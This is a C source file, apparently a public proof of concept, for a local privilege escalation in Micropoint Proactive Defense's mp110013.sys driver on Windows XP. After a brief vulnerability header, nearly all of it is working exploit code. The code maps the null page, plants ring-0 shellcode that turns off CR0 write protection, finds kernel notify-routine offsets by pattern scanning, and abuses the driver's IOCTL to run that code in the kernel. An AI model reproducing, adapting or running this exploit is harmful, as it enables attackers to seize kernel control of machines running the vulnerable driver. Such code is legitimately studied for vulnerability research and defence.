/* Micropoint Proactive Denfense Mp110013.sys <= 1.3.10123.0 Local Privilege Escalation Exploit
   VULNERABLE PRODUCTS
   Micropoint Proactive Denfense <= 100323.1.2.10581.0285.r1
   mp110013.sys <= 1.3.10123.0
   DETAILS:
   mp110013.sys handles DeviceIoControl request which tells driver PspCreateProcessNotifyRoutine/PspCreateProcessNotifyRoutineCount offset ,Attacker can use this interface write  kernel memory
   EXPLOIT CODE
*/
//write ntdll.dll base + 0x8 with "6543" in kernel mode
#include "stdafx.h"
#include "windows.h"
#include "shlwapi.h"
#pragma comment(lib , "shlwapi.lib")
VOID __declspec(naked) ShellCode()
{
__asm
{
   pushad
   mov eax , cr0
   push eax
   and eax, 0xFFFEFFFF
   mov cr0 , eax
   cli
   mov eax , 0xAAAA5555
   mov dword ptr[eax] , 0x33343536
   sti
   pop eax
   mov cr0 , eax
   popad
   ret 0x4
}
}
VOID __declspec(naked) nopfunc()
{
__asm{mov edi ,edi
   nop };
}
enum { SystemModuleInformation = 11,
   SystemHandleInformation = 16 };
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
PVOID GetInfoTable(ULONG ATableType)
{
ULONG mSize = 0x4000;
PVOID mPtr = NULL;
LONG status;
HMODULE hlib = GetModuleHandle("ntdll.dll");
PVOID pZwQuerySystemInformation = GetProcAddress(hlib , "ZwQuerySystemInformation");
do
{
   mPtr = malloc(mSize);
   if (mPtr)
   {
    __asm
    {
     push 0
     push mSize
     push mPtr
     push ATableType
     call pZwQuerySystemInformation
     mov status , eax
    }

   }
   else
   {
    return NULL;
   }
   if (status == 0xc0000004)
   {
    free(mPtr);
    mSize = mSize * 2;
   }
} while (status == 0xc0000004);
if (status == 0)
{
   return mPtr;
}
free(mPtr);
return NULL;
}
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Information[ 1 ];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
DWORD WINAPI LegoThread(LPVOID lpThreadParameter)
{
while(TRUE)
{
   Sleep(0x1000);
}
return 0 ;
}
int main(int argc, char* argv[])
{
DWORD dwVersion = 0;
DWORD dwMajorVersion = 0;
DWORD dwMinorVersion = 0;

    dwVersion = GetVersion();
    // Get the Windows version.
    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
if (dwMajorVersion != 5 || dwMinorVersion != 1)
{
   printf("POC for XP only\n");
   getchar();
   return 0 ;
}
printf("Micropoint Mp110003.sys <= 1.3.10123.0 Local Privilege Escalation Vulnerability POC\n"
   "by MJ0011 th_decoder$126.com\n"
   "Press Enter\n");
getchar();

HANDLE hDev = CreateFile("\\\\.\\mp110013" ,
   0 ,
   FILE_SHARE_READ | FILE_SHARE_WRITE ,
   0,
   OPEN_EXISTING,0,
   0
   );
if (hDev == INVALID_HANDLE_VALUE)
{
   printf("cannot open device %u\n" , GetLastError());
   return 0 ;
}

    PVOID BaseAddress             = (PVOID) 1;
    ULONG RegionSize              = (ULONG) 0;
PVOID pNtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtAllocateVirtualMemory");
PVOID pNtFreeVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtFreeVirtualMemory");
ULONG status ;
    __asm
{
   push 0x8000
   lea eax , RegionSize
   push eax
   lea eax , BaseAddress
   push eax
   push 0xffffffff
   call pNtFreeVirtualMemory
   mov RegionSize,0x1000
   push 0x40
   push 0x3000
   lea eax , RegionSize
   push eax
   push 0
   lea eax , BaseAddress
   push eax
   push 0xffffffff
   call pNtAllocateVirtualMemory
   mov status , eax
}
if (status != 0 )
{
   printf("allocate 0 memory failed %08x\n" , status);
   return 0 ;
}
//set nop code
ULONG codesize = (ULONG)nopfunc - (ULONG)ShellCode;
memset((PVOID)0 , 0x90 , 0x8);
memcpy((PVOID)0x8 , ShellCode , codesize);
ULONG i ;
for (i = 0x8 ; i < codesize+0x8 ; i++)
{
   if (*(DWORD*)i == 0xAAAA5555)
   {
    *(DWORD*)i = (DWORD)(GetModuleHandle("ntdll.dll") + 0x2);
    break ;
   }
}
PSYSTEM_MODULE_INFORMATION pModInfo = (PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);
if (pModInfo == 0 )
{
   printf("get info table failed!\n");
   return 0 ;
}
ULONG Tid ;
HANDLE hThread = CreateThread(0 , 0 , LegoThread , 0 , 0 , &Tid);
if (hThread == 0 )
{
   printf("cannot open thread %u\n",GetLastError());
   return 0 ;
}
//SystemHandleInformation=16
PSYSTEM_HANDLE_INFORMATION pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(16);
if (pHandleInfo == 0 )
{
   printf("cannot get handle info\n");
   return 0 ;
}
ULONG ThreadObject =0;
for (i = 0 ; i < pHandleInfo->NumberOfHandles ; i ++)
{
   if (pHandleInfo->Information[i].UniqueProcessId == GetCurrentProcessId() &&
    pHandleInfo->Information[i].HandleValue == (USHORT)hThread)
   {
    ThreadObject = (ULONG)pHandleInfo->Information[i].Object;
    break ;
   }
}
if (ThreadObject == 0 )
{
   printf("cannot get thread object!\n");
   return 0 ;
}
ThreadObject+=0xd0;

HMODULE hkernel = LoadLibraryA(strrchr(pModInfo->Module[0].ImageName, '\\') + 1);
if (hkernel == 0 )
{
   printf("kernel mapping error %u\n" , GetLastError());
   return 0 ;
}
ULONG PsSetLegoNotifyRoutine = (ULONG)GetProcAddress(hkernel , "PsSetLegoNotifyRoutine");
ULONG PspLegoNotifyRoutine = 0 ;
if (PsSetLegoNotifyRoutine ==0)
{
   printf("PsSetLegoNotifyRoutine==0");
   return 0 ;
}
for (i = PsSetLegoNotifyRoutine ; i < PsSetLegoNotifyRoutine + 0x10 ; i ++)
{
   if (*(BYTE*)i == 0xa3 && *(BYTE*)(i + 5 == 0xb8 ) && *(DWORD*)(i + 6 )==0xd0)
   {
    PspLegoNotifyRoutine = *(ULONG*)(i +1);
    break ;
   }
}
if (PspLegoNotifyRoutine == 0 )
{
   printf("bad PsSetLegoNotifyRoutine\n");
   return 0 ;
}
ULONG PsSetCreateProcessNotifyRoutine = (ULONG)GetProcAddress(hkernel , "PsSetCreateProcessNotifyRoutine");
ULONG PspCreateProcessNotifyRoutine= 0 ;
if (PsSetCreateProcessNotifyRoutine==0)
{
   printf("PsSetCreateProcessNotifyRoutine==0!\n");
   return 0 ;
}
for (i = PsSetCreateProcessNotifyRoutine ; i < PsSetCreateProcessNotifyRoutine + 0x30 ; i ++)
{
   if (*(BYTE*)i == 0xbf && *(WORD*)(i + 5) == 0xe857)
   {
    PspCreateProcessNotifyRoutine = *(ULONG*)(i + 1);
    break ;
   }
}
if (PspCreateProcessNotifyRoutine ==0)
{
   printf("bad PsSetCreateProcessNotifyRoutine!\n");
   return 0 ;
}
PIMAGE_DOS_HEADER doshdr ;
PIMAGE_NT_HEADERS nthdr ;
doshdr = (PIMAGE_DOS_HEADER )(hkernel);
nthdr = (PIMAGE_NT_HEADERS)((ULONG)hkernel + doshdr->e_lfanew);
PspLegoNotifyRoutine += (ULONG)pModInfo->Module[0].Base - nthdr->OptionalHeader.ImageBase;
PspCreateProcessNotifyRoutine += (ULONG)pModInfo->Module[0].Base - nthdr->OptionalHeader.ImageBase;
FreeLibrary(hkernel);
ULONG PspLegoNotifyRoutineOff = (ULONG)PspLegoNotifyRoutine - (ULONG)pModInfo->Module[0].Base ;
ULONG PspCreateProcessNotifyRoutineOff = (ULONG)PspCreateProcessNotifyRoutine - (ULONG)pModInfo->Module[0].Base;
ULONG btr ;
ULONG InputBuffer[3] = {0x0 , PspCreateProcessNotifyRoutineOff , PspLegoNotifyRoutineOff };
if (!DeviceIoControl(hDev ,
   0x800001A4,
   &InputBuffer ,
   sizeof(ULONG)*3 ,
   NULL,
   0,
   &btr ,
   0))
{
   printf("device io control failed %u\n", GetLastError());
   return 0 ;
}
PVOID pNtCreateProcessEx = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtCreateProcessEx");
HANDLE hProc ;
__asm
{
   push 0
   push 0
   push 0
   push 0
   push 0
   push 0x1
   push 0
   push 0
   lea eax ,hProc
   push eax
   call pNtCreateProcessEx
}
ULONG ThreadLegoDataOff = ThreadObject - (ULONG)pModInfo->Module[0].Base ;
InputBuffer[2] = ThreadLegoDataOff;
if (!DeviceIoControl(hDev ,
   0x800001A4,
   &InputBuffer ,
   sizeof(ULONG)*3 ,
   NULL,
   0,
   &btr ,
   0))
{
   printf("device io control failed %u\n", GetLastError());
   return 0 ;
}

__asm
{
   push 0
    push 0
    push 0
    push 0
    push 0
    push 0x1
    push 0
    push 0
    lea eax ,hProc
    push eax
    call pNtCreateProcessEx
}

TerminateThread(hThread , 0 );
printf("POC Executed\n");
getchar();
return 0;
}